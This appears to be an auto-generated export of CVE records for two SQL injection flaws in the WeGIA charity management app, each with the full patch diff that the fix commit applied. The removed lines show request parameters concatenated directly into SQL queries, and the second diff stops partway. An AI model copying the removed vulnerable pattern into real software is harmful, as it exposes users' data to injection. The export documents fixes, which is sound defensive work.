CVE Database Export (Filtered - With Patches Only)
Generated: 2025-10-02T03:42:22.294270
Total CVEs with patches: 453
================================================================================


CVE ID: CVE-2025-53529
Published: 2025-07-07T17:15:30.030
Modified: 2025-07-10T21:16:36.407
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
WeGIA is a web manager for charitable institutions. An SQL Injection vulnerability was identified in the /html/funcionario/profile_funcionario.php endpoint. The id_funcionario parameter is not properly sanitized or validated before being used in a SQL query, allowing an unauthenticated attacker to inject arbitrary SQL commands. The vulnerability is fixed in 3.4.3.

References (2):
  1. https://github.com/LabRedesCefetRJ/WeGIA/commit/0a061bcc5024937edd18ab3e65ccc8f38deb6957 [Patch]
  2. https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-rrj6-pj6w-8j2r [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/LabRedesCefetRJ/WeGIA/commit/0a061bcc5024937edd18ab3e65ccc8f38deb6957 ---
From 0a061bcc5024937edd18ab3e65ccc8f38deb6957 Mon Sep 17 00:00:00 2001
From: GabrielPintoSouza <gabrielpintosouz4@gmail.com>
Date: Thu, 26 Jun 2025 09:58:21 -0300
Subject: [PATCH] =?UTF-8?q?Resolu=C3=A7=C3=A3o=20SQL=20Injection=20em=20pr?=
 =?UTF-8?q?ofile.funcionario.php=20[Security=20https://github.com/LabRedes?=
 =?UTF-8?q?CefetRJ/WeGIA/security/advisories/GHSA-rrj6-pj6w-8j2r]?=
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

---
 html/funcionario/profile_funcionario.php | 265 ++++++++++++++---------
 1 file changed, 165 insertions(+), 100 deletions(-)

diff --git a/html/funcionario/profile_funcionario.php b/html/funcionario/profile_funcionario.php
index e09396121..8e06a8a26 100755
--- a/html/funcionario/profile_funcionario.php
+++ b/html/funcionario/profile_funcionario.php
@@ -4,67 +4,102 @@
 error_reporting(E_ALL);
 extract($_REQUEST);
 session_start();
-require_once "../../dao/Conexao.php";
-$pdo = Conexao::connect();
+
 if (!isset($_SESSION['usuario'])) {
   header("Location: ../index.php");
-} else if (!isset($_SESSION['funcionario'])) {
-  $id_funcionario = $_GET['id_funcionario'];
-  header('Location: ../../controle/control.php?metodo=listarUm&nomeClasse=FuncionarioControle&nextPage=../html/funcionario/profile_funcionario.php?id_funcionario=' . $id_funcionario . '&id_funcionario=' . $id_funcionario);
-} else {
-  $func = $_SESSION['funcionario'];
-  unset($_SESSION['funcionario']);
-  // Adiciona Descrição de escala e tipo
-  $func = json_decode($func);
-  if ($func) {
-    $func = $func[0];
-    if ($func->tipo) {
-      $func->tipo_descricao = $pdo->query("SELECT descricao FROM tipo_quadro_horario WHERE id_tipo=" . $func->tipo)->fetch(PDO::FETCH_ASSOC)['descricao'];
+  exit();
+}
+
+//Sanitizar entrada do id_funcionario
+$idFuncionario = filter_input(INPUT_GET, 'id_funcionario', FILTER_SANITIZE_NUMBER_INT);
+
+//Verificar se é um id válido
+if (!$idFuncionario || $idFuncionario < 1) {
+  echo json_encode(['erro' => 'O id de um funcionário deve ser maior ou igual a 1.']);
+  exit(400);
+}
+
+try {
+  require_once "../../dao/Conexao.php";
+  $pdo = Conexao::connect();
+
+  if (!isset($_SESSION['funcionario'])) {
+    header('Location: ../../controle/control.php?metodo=listarUm&nomeClasse=FuncionarioControle&nextPage=../html/funcionario/profile_funcionario.php?id_funcionario=' . $idFuncionario . '&id_funcionario=' . $idFuncionario);
+  } else {
+    $func = $_SESSION['funcionario'];
+    unset($_SESSION['funcionario']);
+    // Adiciona Descrição de escala e tipo
+    $func = json_decode($func);
+    if ($func) {
+      $func = $func[0];
+      if ($func->tipo) {
+        $func->tipo_descricao = $pdo->query("SELECT descricao FROM tipo_quadro_horario WHERE id_tipo=" . $func->tipo)->fetch(PDO::FETCH_ASSOC)['descricao'];
+      }
+      if ($func->escala) {
+        $func->escala_descricao = $pdo->query("SELECT descricao FROM escala_quadro_horario WHERE id_escala=" . $func->escala)->fetch(PDO::FETCH_ASSOC)['descricao'];
+      }
+      $func = json_encode([$func]);
     }
-    if ($func->escala) {
-      $func->escala_descricao = $pdo->query("SELECT descricao FROM escala_quadro_horario WHERE id_escala=" . $func->escala)->fetch(PDO::FETCH_ASSOC)['descricao'];
+  }
+  $config_path = "config.php";
+  if (file_exists($config_path)) {
+    require_once($config_path);
+  } else {
+    while (true) {
+      $config_path = "../" . $config_path;
+      if (file_exists($config_path)) break;
     }
-    $func = json_encode([$func]);
+    require_once($config_path);
   }
-}
-$config_path = "config.php";
-if (file_exists($config_path)) {
-  require_once($config_path);
-} else {
-  while (true) {
-    $config_path = "../" . $config_path;
-    if (file_exists($config_path)) break;
+  require_once "../permissao/permissao.php";
+  permissao($_SESSION['id_pessoa'], 11, 7);
+
+  $situacao = $pdo->query("SELECT * FROM situacao")->fetchAll();
+  $cargo = $pdo->query("SELECT * FROM cargo")->fetchAll();
+  // Adiciona a Função display_campo($nome_campo, $tipo_campo)
+  require_once "../personalizacao_display.php";
+  require_once "../../dao/Conexao.php";
+  require_once ROOT . "/controle/FuncionarioControle.php";
+  $cpf = new FuncionarioControle;
+  $cpf->listarCPF();
+  require_once ROOT . "/controle/AtendidoControle.php";
+  $cpf1 = new AtendidoControle;
+  $cpf1->listarCPF();
+  require_once "../geral/msg.php";
+  $docfuncional = $pdo->prepare("SELECT * FROM funcionario_docs f JOIN funcionario_docfuncional docf ON f.id_docfuncional = docf.id_docfuncional WHERE id_funcionario =:idFuncionario");
+
+  $docfuncional->bindValue(':idFuncionario', $idFuncionario, PDO::PARAM_INT);
+
+  if (!$docfuncional->execute()) {
+    echo json_encode(['erro' => 'Falha ao executar consulta da documentação do funcionário']);
+    exit(500);
   }
-  require_once($config_path);
-}
-require_once "../permissao/permissao.php";
-permissao($_SESSION['id_pessoa'], 11, 7);
-$mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
-$situacao = $mysqli->query("SELECT * FROM situacao");
-$cargo = $mysqli->query("SELECT * FROM cargo");
-// Adiciona a Função display_campo($nome_campo, $tipo_campo)
-require_once "../personalizacao_display.php";
-require_once "../../dao/Conexao.php";
-require_once ROOT . "/controle/FuncionarioControle.php";
-$cpf = new FuncionarioControle;
-$cpf->listarCPF();
-require_once ROOT . "/controle/AtendidoControle.php";
-$cpf1 = new AtendidoControle;
-$cpf1->listarCPF();
-require_once "../geral/msg.php";
-$docfuncional = $pdo->query("SELECT * FROM funcionario_docs f JOIN funcionario_docfuncional docf ON f.id_docfuncional = docf.id_docfuncional WHERE id_funcionario = " . $_GET['id_funcionario']);
-$docfuncional = $docfuncional->fetchAll(PDO::FETCH_ASSOC);
-foreach ($docfuncional as $key => $value) {
-  $docfuncional[$key]["arquivo"] = gzuncompress($value["arquivo"]);
-
-  //formatar data
-  $data = new DateTime($value['data']);
-  $docfuncional[$key]['data'] = $data->format('d/m/Y h:i:s');
+
+  $docfuncional = $docfuncional->fetchAll(PDO::FETCH_ASSOC);
+  foreach ($docfuncional as $key => $value) {
+    $docfuncional[$key]["arquivo"] = gzuncompress($value["arquivo"]);
+
+    //formatar data
+    $data = new DateTime($value['data']);
+    $docfuncional[$key]['data'] = $data->format('d/m/Y h:i:s');
+  }
+  $docfuncional = json_encode($docfuncional);
+  //SQL Injection abaixo
+  $dependente = $pdo->prepare("SELECT fdep.id_dependente AS id_dependente, p.nome AS nome, p.cpf AS cpf, par.descricao AS parentesco FROM funcionario_dependentes fdep LEFT JOIN funcionario f ON f.id_funcionario = fdep.id_funcionario LEFT JOIN pessoa p ON p.id_pessoa = fdep.id_pessoa LEFT JOIN funcionario_dependente_parentesco par ON par.id_parentesco = fdep.id_parentesco WHERE fdep.id_funcionario =:idFuncionario");
+
+  $dependente->bindValue(':idFuncionario', $idFuncionario, PDO::PARAM_INT);
+
+  if (!$dependente->execute()) {
+    echo json_encode(['erro' => 'Falha ao consultar dependentes de um funcionário']);
+    exit(500);
+  }
+
+  $dependente = $dependente->fetchAll(PDO::FETCH_ASSOC);
+  $dependente = json_encode($dependente);
+} catch (Exception $e) {
+  echo json_encode(['erro' => $e->getMessage()]);
+  exit($e->getCode());
 }
-$docfuncional = json_encode($docfuncional);
-$dependente = $pdo->query("SELECT fdep.id_dependente AS id_dependente, p.nome AS nome, p.cpf AS cpf, par.descricao AS parentesco FROM funcionario_dependentes fdep LEFT JOIN funcionario f ON f.id_funcionario = fdep.id_funcionario LEFT JOIN pessoa p ON p.id_pessoa = fdep.id_pessoa LEFT JOIN funcionario_dependente_parentesco par ON par.id_parentesco = fdep.id_parentesco WHERE fdep.id_funcionario = " . $_GET['id_funcionario']);
-$dependente = $dependente->fetchAll(PDO::FETCH_ASSOC);
-$dependente = json_encode($dependente);
 ?>
 <!doctype html>
 <html class="fixed">
@@ -676,18 +711,24 @@ function adicionar_cargo() {
               <div class="panel-body">
                 <div class="thumb-info mb-md">
                   <?php
-                  $conexao = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
                   $id_pessoa = $_SESSION['id_pessoa'];
-                  $donoimagem = $_GET['id_funcionario'];
-                  //$resultado = mysqli_query($conexao, "SELECT `imagem`, `nome` FROM `pessoa` WHERE id_pessoa=$id_pessoa");
-                  $resultado = mysqli_query($conexao, "SELECT pessoa.imagem, pessoa.nome FROM pessoa, funcionario  WHERE pessoa.id_pessoa=funcionario.id_pessoa and funcionario.id_funcionario=$donoimagem");
-                  $pessoa = mysqli_fetch_array($resultado);
-                  if (isset($_SESSION['id_pessoa']) and !empty($_SESSION['id_pessoa'])) {
-                    $foto = $pessoa['imagem'];
-                    if ($foto != null and $foto != "") {
-                      $foto = 'data:image;base64,' . $foto;
-                    } else {
-                      $foto = WWW . "img/semfoto.png";
+
+                  //SQL Injection abaixo
+                  $stmtImagem = $pdo->prepare("SELECT pessoa.imagem, pessoa.nome FROM pessoa, funcionario  WHERE pessoa.id_pessoa=funcionario.id_pessoa and funcionario.id_funcionario=:idFuncionario");
+
+                  $stmtImagem->bindValue(':idFuncionario', $idFuncionario, PDO::PARAM_INT);
+
+                  if (!$stmtImagem->execute()) {
+                    $foto = WWW . "img/semfoto.png";
+                  } else {
+                    $pessoa = $stmtImagem->fetch(PDO::FETCH_ASSOC);
+                    if (isset($_SESSION['id_pessoa']) and !empty($_SESSION['id_pessoa'])) {
+                      $foto = $pessoa['imagem'];
+                      if ($foto != null and $foto != "") {
+                        $foto = 'data:image;base64,' . $foto;
+                      } else {
+                        $foto = WWW . "img/semfoto.png";
+                      }
                     }
                   }
                   echo "<img src='$foto' style='margin-bottom: 15px;' id='imagem' class='rounded img-responsive' alt='John Doe'>";
@@ -715,7 +756,8 @@ function adicionar_cargo() {
                               </div>
                           </div>
                           <div class="modal-footer">
-                            <input type="hidden" name="id_funcionario" value=<?php echo $_GET['id_funcionario'] ?>>
+                            <!-- Pegar id funcionário de variável sanitizada -->
+                            <input type="hidden" name="id_funcionario" value=<?= $idFuncionario ?>>
                             <input type="submit" id="formsubmit" value="Alterar imagem">
                           </div>
                         </div>
@@ -829,7 +871,8 @@ function adicionar_cargo() {
                           </select>
                         </div>
                       </div>
-                      <input type="hidden" name="id_funcionario" value=<?php echo $_GET['id_funcionario'] ?>>
+                      <!-- Pegar id funcionário de variável sanitizada -->
+                      <input type="hidden" name="id_funcionario" value=<?= $idFuncionario ?>>
                       <button type="button" class="btn btn-primary" id="botaoEditarIP" onclick="return editar_informacoes_pessoais()">Editar</button>
                       <input type="submit" class="btn btn-primary" disabled="true" value="Salvar" id="botaoSalvarIP">
                     </fieldset>
@@ -851,7 +894,8 @@ function adicionar_cargo() {
                         </div>
                         <div class="modal-body">
                           <p> Tem certeza que deseja demitir esse funcionário? Essa ação não poderá ser desfeita e todas as informações referentes a esse funcionário serão perdidas!</p>
-                          <a href="../../controle/control.php?metodo=excluir&nomeClasse=FuncionarioControle&id_funcionario=<?php echo $_GET['id_funcionario']; ?>"><button button type="button" class="btn btn-success">Confirmar</button></a>
+                          <!-- Pegar id funcionário de variável sanitizada -->
+                          <a href="../../controle/control.php?metodo=excluir&nomeClasse=FuncionarioControle&id_funcionario=<?= $idFuncionario ?>"><button button type="button" class="btn btn-success">Confirmar</button></a>
                           <button button type="button" class="btn btn-default" data-dismiss="modal">Cancelar</button>
                         </div>
                       </div>
@@ -926,7 +970,8 @@ function adicionar_cargo() {
                                   <input type="date" name="fim" id="fim_remuneracao" class="form-control">
                                 </div>
                               </div>
-                              <input type="hidden" name="id_funcionario" value=<?php echo $_GET['id_funcionario'] ?>>
+                              <!-- Pegar id funcionário de variável sanitizada -->
+                              <input type="hidden" name="id_funcionario" value=<?= $idFuncionario ?>>
                               <input type="hidden" name="action" value="remuneracao_adicionar">
                               <button class="btn btn-primary" id="botaoSalvarRemuneracao" onclick="adicionarRemuneracao('formRemuneracao', console.log)">Salvar</button>
                             </fieldset>
@@ -1060,7 +1105,7 @@ class="form-control serie_reservista" maxlength="3"
                             <select class="form-control input-lg mb-md" name="situacao" id="situacao">
                               <option selected disabled>Selecionar</option>
                               <?php
-                              while ($row = $situacao->fetch_array(MYSQLI_NUM)) {
+                              foreach ($situacao as $row) {
                                 echo "<option value=" . $row[0] . ">" . htmlspecialchars($row[1]) . "</option>";
                               }
                               ?>
@@ -1074,7 +1119,7 @@ class="form-control serie_reservista" maxlength="3"
                             <select class="form-control input-lg mb-md" name="cargo" id="cargo">
                               <option selected disabled>Selecionar</option>
                               <?php
-                              while ($row = $cargo->fetch_array(MYSQLI_NUM)) {
+                              foreach ($cargo as $row) {
                                 echo "<option value=" . $row[0] . ">" . htmlspecialchars($row[1]) . "</option>";
                               }
                               ?>
@@ -1082,7 +1127,8 @@ class="form-control serie_reservista" maxlength="3"
                           </div>
                           <a onclick="adicionar_cargo()"><i class="fas fa-plus w3-xlarge" style="margin-top: 0.75vw"></i></a>
                         </div>
-                        <input type="hidden" name="id_funcionario" value=<?php echo $_GET['id_funcionario'] ?>>
+                        <!-- Pegar id funcionário de variável sanitizada -->
+                        <input type="hidden" name="id_funcionario" value=<?= $idFuncionario ?>>
                         <button type="button" class="btn btn-primary" id="botaoEditarOutros" onclick="return editar_outros()">Editar</button>
                         <input type="submit" class="btn btn-primary" value="Salvar" id="botaoSalvarOutros" disabled="true">
                       </form>
@@ -1097,17 +1143,27 @@ class="form-control serie_reservista" maxlength="3"
                         </thead>
                         <tbody id="addInfo-tab">
                           <?php
-                          $id_funcionario = $_GET['id_funcionario'];
-                          $infoAdd = $pdo->query("SELECT * FROM funcionario_outrasinfo WHERE funcionario_id_funcionario = '$id_funcionario';")->fetchAll(PDO::FETCH_ASSOC);
-                          $tam = count($infoAdd);
-                          for ($i = 0; $i < $tam; $i++) {
-                            $dado = htmlspecialchars($infoAdd[$i]['dado']);
-                            $desc_id = htmlspecialchars($infoAdd[$i]['funcionario_listainfo_idfuncionario_listainfo']);
-                            $idInfoAdicional = $infoAdd[$i]['idfunncionario_outrasinfo'];
-                            $descricao = $pdo->query("SELECT descricao FROM funcionario_listainfo WHERE idfuncionario_listainfo = '$desc_id';")->fetchAll(PDO::FETCH_ASSOC);
-                            $nome_desc = htmlspecialchars($descricao[0]['descricao']);
-                            echo
-                            "
+                          try {
+                            $stmtInfoAdd = $pdo->prepare("SELECT * FROM funcionario_outrasinfo WHERE funcionario_id_funcionario =:idFuncionario");
+                            $stmtInfoAdd->bindValue(':idFuncionario', $idFuncionario, PDO::PARAM_INT);
+                            $stmtInfoAdd->execute();
+                            $infoAdd = $stmtInfoAdd->fetchAll(PDO::FETCH_ASSOC);
+
+                            $tam = count($infoAdd);
+                            for ($i = 0; $i < $tam; $i++) {
+                              $dado = htmlspecialchars($infoAdd[$i]['dado']);
+                              $descricaoId = htmlspecialchars($infoAdd[$i]['funcionario_listainfo_idfuncionario_listainfo']);
+                              $idInfoAdicional = $infoAdd[$i]['idfunncionario_outrasinfo'];
+
+                              $stmtDescricao = $pdo->prepare("SELECT descricao FROM funcionario_listainfo WHERE idfuncionario_listainfo =:descricaoId");
+
+                              $stmtDescricao->bindValue(':descricaoId', $descricaoId, PDO::PARAM_INT);
+                              $stmtDescricao->execute();
+                              $descricao = $stmtDescricao->fetchAll(PDO::FETCH_ASSOC);
+
+                              $nome_desc = htmlspecialchars($descricao[0]['descricao']);
+                              echo
+                              "
                                   <tr id='$idInfoAdicional'>
                                     <td>$nome_desc</td>
                                     <td>$dado</td>
@@ -1116,6 +1172,10 @@ class="form-control serie_reservista" maxlength="3"
                                     </td>
                                   </tr>
                                 ";
+                            }
+                          } catch (PDOException $e) {
+                            echo json_encode(['erro' => $e->getMessage()]);
+                            exit($e->getCode());
                           }
                           ?>
                         </tbody>
@@ -1155,7 +1215,8 @@ class="form-control serie_reservista" maxlength="3"
                                   <textarea class="form-control" id="dados_addInfo" style="padding: 6px 12px; height: 120px;" name="dados" maxlength="255" required></textarea>
                                 </div>
                                 <input type="text" name="action" value="adicionar" hidden>
-                                <input type="text" name="id_funcionario" value="<?= $_GET['id_funcionario']; ?>" hidden>
+                                <!-- Pegar id funcionário de variável sanitizada -->
+                                <input type="text" name="id_funcionario" value="<?= $idFuncionario ?>" hidden>
                               </form>
                             </div>
                             <div class="modal-footer">
@@ -1168,7 +1229,8 @@ class="form-control serie_reservista" maxlength="3"
                                       [0, "asc"]
                                     ]
                                   });
-                                  post("informacao_adicional.php", "action='listar'&id_funcionario=<?= $_GET['id_funcionario'] ?>")
+                                  //Pegar id funcionário de variável sanitizada
+                                  post("informacao_adicional.php", "action='listar'&id_funcionario=<?= $idFuncionario ?>")
                                 });
 
                                 function adicionar_addInfoDescricao() {
@@ -1212,10 +1274,11 @@ function removerDescricao(id_descricao) {
 
                                 //Refazer lógica abaixo
                                 function listarInfoAdicional(lista) {
-
+                                  //Pegar id funcionário de variável sanitizada
+                                  console.log('Linha 1279');
                                   $.ajax({
                                     type: "GET",
-                                    url: `../../controle/control.php?nomeClasse=${encodeURIComponent('InformacaoAdicionalControle')}&metodo=${encodeURIComponent('getTodasInformacoesAdicionaisPorIdFuncionario')}&id_funcionario=<?= $_GET['id_funcionario'] ?>`,
+                                    url: `../../controle/control.php?nomeClasse=${encodeURIComponent('InformacaoAdicionalControle')}&metodo=${encodeURIComponent('getTodasInformacoesAdicionaisPorIdFuncionario')}&id_funcionario=<?= $idFuncionario ?>`,
                                     dataType: 'json',
                                     success: function(resp) {
                                       console.log('Informações adicionais', resp);
@@ -1422,7 +1485,7 @@ function listarInfoAdicional(lista) {
                         <hr class="dotted short">
                         <input type="hidden" name="nomeClasse" value="FuncionarioControle">
                         <input type="hidden" name="metodo" value="alterarCargaHoraria">
-                        <input type="hidden" name="id_funcionario" value=<?php echo $_GET['id_funcionario'] ?>>
+                        <input type="hidden" name="id_funcionario" value=<?= $idFuncionario ?>>
                         <div class="form-group center">
                           <button type="button" class="btn btn-primary" id="botaoEditar_editar_cargaHoraria" onclick="switchForm('editar_cargaHoraria')">Editar</button>
                           <input id="enviarCarga" type="submit" class="btn btn-primary" value="Alterar carga">
@@ -1477,7 +1540,7 @@ function listarInfoAdicional(lista) {
                             <p class="cpfInvalido" style="display: none; color: #b30000">CPF INVÁLIDO!</p>
                           </div>
                         </div>
-                        <input type="hidden" id="id_funcionario" name="id_funcionario" value=<?php echo $_GET['id_funcionario'] ?>>
+                        <input type="hidden" id="id_funcionario" name="id_funcionario" value=<?= $idFuncionario ?>>
                         <button type="button" class="btn btn-primary" id="botaoEditarDocumentacao" onclick="return editar_documentacao()">Editar</button>
                         <input id="botaoSalvarDocumentacao" type="submit" class="btn btn-primary" disabled="true" value="Salvar" onclick="funcao3()">
                       </form>
@@ -1538,7 +1601,7 @@ function listarInfoAdicional(lista) {
                                   <label for="arquivoDocumento">Arquivo</label>
                                   <input name="arquivo" type="file" class="form-control-file" id="arquivoDocumento" accept="png;jpeg;jpg;pdf;docx;doc;odp" required>
                                 </div>
-                                <input type="number" name="id_funcionario" value="<?= $_GET['id_funcionario']; ?>" style='display: none;'>
+                                <input type="number" name="id_funcionario" value="<?= $idFuncionario ?>" style='display: none;'>
                               </div>
                               <div class="modal-footer">
                                 <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancelar</button>
@@ -1577,7 +1640,7 @@ function listarInfoAdicional(lista) {
                         Adicionar Dependente
                       </button>
                     </div>
-                    
+
                     <!-- Modal Form Dependentes to Cpf -->
                     <div class="modal fade" id="depFormModal" tabindex="-1" role="dialog" aria-labelledby="depFormModalLabel" aria-hidden="true">
                       <div class="modal-dialog" role="document">
@@ -1618,7 +1681,7 @@ function listarInfoAdicional(lista) {
                                     <a onclick="adicionarParentesco()" style="margin: 0 20px;"><i class="fas fa-plus w3-xlarge" style="margin-top: 0.75vw"></i></a>
                                   </div>
                                 </div>
-                                <input type="hidden" name="id_funcionario" value=<?= $_GET['id_funcionario']; ?> readonly>
+                                <input type="hidden" name="id_funcionario" value=<?= $idFuncionario ?> readonly>
                                 <div class="modal-footer">
                                   <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancelar</button>
                                   <input id="enviarDependente" type="submit" value="Enviar" class="btn btn-primary">
@@ -1718,10 +1781,12 @@ function listarInfoAdicional(lista) {
                                 <div class="form-group">
                                   <label class="col-md-3 control-label" for="profileCompany">Data de expedição</label>
                                   <div class="col-md-6">
-                                    <input type="date" class="form-control" maxlength="10" placeholder="dd/mm/aaaa" id="profileCompany" name="data_expedicao" id="data_expedicao" max=<?php echo date('Y-m-d'); ?>>
+                                    <input type="date" class="form-control" maxlength="10" placeholder="dd/mm/aaaa" id="profileCompany" name="data_expedicao" id="data_expedicao" max=<?php //echo date('Y-m-d'); 
+                                                                                                                                                                                      ?>>
                                   </div>
                                 </div>
-                                <input type="hidden" name="id_funcionario" value=<?= $_GET['id_funcionario']; ?> readonly>
+                                <input type="hidden" name="id_funcionario" value=<?php //echo $idFuncionario
+                                                                                  ?> readonly>
                                 <div class="modal-footer">
                                   <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancelar</button>
                                   <input type="submit" value="Enviar" class="btn btn-primary">
@@ -1803,7 +1868,7 @@ function listarInfoAdicional(lista) {
                           </div>
                         </div>
                         <div class="form-group center">
-                          <input type="hidden" name="id_funcionario" value=<?php echo $_GET['id_funcionario'] ?>>
+                          <input type="hidden" name="id_funcionario" value=<?= $idFuncionario ?>>
                           <button type="button" class="btn btn-primary" id="botaoEditarEndereco" onclick="return editar_endereco()">Editar</button>
                           <input id="botaoSalvarEndereco" type="submit" class="btn btn-primary" disabled="true" value="Salvar" onclick="funcao3()">
                         </div>
@@ -1914,7 +1979,7 @@ function adicionarTipoRemuneracao() {
 
     function removerRemuneracao(id) {
       var url = "remuneracao.php";
-      var data = "action=remover&id_remuneracao=" + id + "&id_funcionario=<?= $_GET['id_funcionario'] ?>";
+      var data = "action=remover&id_remuneracao=" + id + "&id_funcionario=<?= $idFuncionario ?>";
       post(url, data, listar_remuneracao);
     }
 
@@ -1930,11 +1995,11 @@ function gerarTipoRemuneracao(response) {
       });
     }
     $(function() {
-      post("remuneracao.php", "action=listar&id_funcionario=<?= $_GET['id_funcionario'] ?>", listar_remuneracao);
+      post("remuneracao.php", "action=listar&id_funcionario=<?= $idFuncionario ?>", listar_remuneracao);
     })
 
     function funcao3() {
-      var idfunc = <?php echo $_GET['id_funcionario']; ?>;
+      var idfunc = <?= $idFuncionario ?>;
       var cpfs = <?php echo $_SESSION['cpf_funcionario']; ?>;
       var cpf_funcionario = $("#cpf").val();
       var cpf_funcionario_correto = cpf_funcionario.replace(".", "");
@@ -2057,7 +2122,7 @@ function verificaSucesso(response) {
 
     function removerDependente(id_dep) {
       let url = "dependente_remover.php";
-      let data = "id_funcionario=<?= $_GET['id_funcionario']; ?>&id_dependente=" + id_dep;
+      let data = "id_funcionario=<?= $idFuncionario ?>&id_dependente=" + id_dep;
       post(url, data, verificaSucesso);
     }
 
@@ -2065,7 +2130,7 @@ function removerFuncionarioDocs(id_doc) {
       if (!window.confirm("Tem certeza que deseja remover esse documento?")) {
         return false;
       }
-      let url = "documento_excluir.php?id_doc=" + id_doc + "&id_funcionario=<?= $_GET["id_funcionario"] ?>";
+      let url = "documento_excluir.php?id_doc=" + id_doc + "&id_funcionario=<?= $idFuncionario ?>";
       let data = "";
       post(url, data, listarFunDocs);
     }


================================================================================


CVE ID: CVE-2025-53527
Published: 2025-07-07T17:15:29.860
Modified: 2025-07-10T21:16:47.187
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
WeGIA is a web manager for charitable institutions. A Time-Based Blind SQL Injection vulnerability was discovered in the almox parameter of the /controle/relatorio_geracao.php endpoint. This issue allows attacker to inject arbitrary SQL queries, potentially leading to unauthorized data access or further exploitation depending on database configuration. This vulnerability is fixed in 3.4.1.

References (3):
  1. https://github.com/LabRedesCefetRJ/WeGIA/commit/9de9a741d1d26ae76b2215a32660817d9bd452aa [Patch]
  2. https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-43xw-c4g6-jgff [Exploit, Vendor Advisory]
  3. https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-43xw-c4g6-jgff [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/LabRedesCefetRJ/WeGIA/commit/9de9a741d1d26ae76b2215a32660817d9bd452aa ---
From 9de9a741d1d26ae76b2215a32660817d9bd452aa Mon Sep 17 00:00:00 2001
From: GabrielPintoSouza <gabrielpintosouz4@gmail.com>
Date: Wed, 11 Jun 2025 11:04:32 -0300
Subject: [PATCH] =?UTF-8?q?Resolu=C3=A7=C3=A3o=20de=20Security=20https://g?=
 =?UTF-8?q?ithub.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-43xw-c?=
 =?UTF-8?q?4g6-jgff?=
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

---
 html/relatorios/Relatorio_item.php | 453 +++++++++++++++++------------
 1 file changed, 270 insertions(+), 183 deletions(-)

diff --git a/html/relatorios/Relatorio_item.php b/html/relatorios/Relatorio_item.php
index ce3421682..5bec810ec 100755
--- a/html/relatorios/Relatorio_item.php
+++ b/html/relatorios/Relatorio_item.php
@@ -2,7 +2,8 @@
 require_once ROOT . "/dao/Conexao.php";
 require_once ROOT . "/classes/Util.php";
 
-class Item {
+class Item
+{
 
     private $relatorio;
     private $origem;
@@ -12,12 +13,14 @@ class Item {
     private $periodo; // Array('inicio' => data de inicio, 'fim' => data de fim)
     private $almoxarifado;
     private $query;
+    private $paramsExternos = [];
     private $mostrarZerado;
     private $DDL_cmd;
 
     // Constructor
 
-    public function __construct($relat, $o_d, $t, $resp, $p, $a, $z=false){
+    public function __construct($relat, $o_d, $t, $resp, $p, $a, $z = false)
+    {
         $this
             ->setRelatorio($relat)
             ->setOrigem($o_d)
@@ -32,283 +35,367 @@ public function __construct($relat, $o_d, $t, $resp, $p, $a, $z=false){
 
     // Metodos
 
-    public function hasValue(){
+    public function hasValue()
+    {
         return ($this->getOrigem()
-        || $this->getTipo()
-        || $this->getResponsavel()
-        || $this->getPeriodo()['inicio']
-        || $this->getPeriodo()['fim']
-        || $this->getAlmoxarifado()
-        || $this->getMostrarZerado()
-    );
+            || $this->getTipo()
+            || $this->getResponsavel()
+            || $this->getPeriodo()['inicio']
+            || $this->getPeriodo()['fim']
+            || $this->getAlmoxarifado()
+            || $this->getMostrarZerado()
+        );
     }
 
-    private function param($params, $cont){
-        if ($cont){
-            return $params.'AND';
+    private function param($params, $cont)
+    {
+        if ($cont) {
+            return $params . 'AND';
         }
         return $params;
     }
 
-    private function entrada(){
-        if ($this->hasValue()){
+    private function entrada()
+    {
+        if ($this->hasValue()) {
             $params = "WHERE ientrada.qtd > 0 AND ientrada.oculto=false ";
             $cont = 2;
-            if ($this->getOrigem()){
-                $params = $this->param($params, $cont).' origem.id_origem = '.$this->getOrigem().' ';
+
+            if ($this->getOrigem()) {
+                $params = $this->param($params, $cont) . ' origem.id_origem = :idOrigem ';
+                $this->paramsExternos[':idOrigem'] = $this->getOrigem();
                 $cont++;
             }
-            if ($this->getTipo()){
-                $params = $this->param($params, $cont).' tipo_entrada.id_tipo = '.$this->getTipo().' ';
+
+            if ($this->getTipo()) {
+                $params = $this->param($params, $cont) . ' tipo_entrada.id_tipo = :idTipo ';
+                $this->paramsExternos[':idTipo'] = $this->getTipo();
                 $cont++;
             }
-            if ($this->getResponsavel()){
-                $params = $this->param($params, $cont).' pessoa.id_pessoa = "'.$this->getResponsavel().'" ';
+
+            if ($this->getResponsavel()) {
+                $params = $this->param($params, $cont) . ' pessoa.id_pessoa = :idPessoa ';
+                $this->paramsExternos[':idPessoa'] = $this->getResponsavel();
                 $cont++;
             }
-            if ($this->getAlmoxarifado()){
-                $params = $this->param($params, $cont).' almoxarifado.id_almoxarifado = '.$this->getAlmoxarifado().' ';
+
+            if ($this->getAlmoxarifado()) {
+                $params = $this->param($params, $cont) . ' almoxarifado.id_almoxarifado = :idAlmoxarifado ';
+                $this->paramsExternos[':idAlmoxarifado'] = $this->getAlmoxarifado();
                 $cont++;
             }
-            if ($this->getPeriodo()['inicio']){
-                $params = $this->param($params, $cont)." entrada.data >= '".$this->getPeriodo()['inicio']."' ";
+
+            if ($this->getPeriodo()['inicio']) {
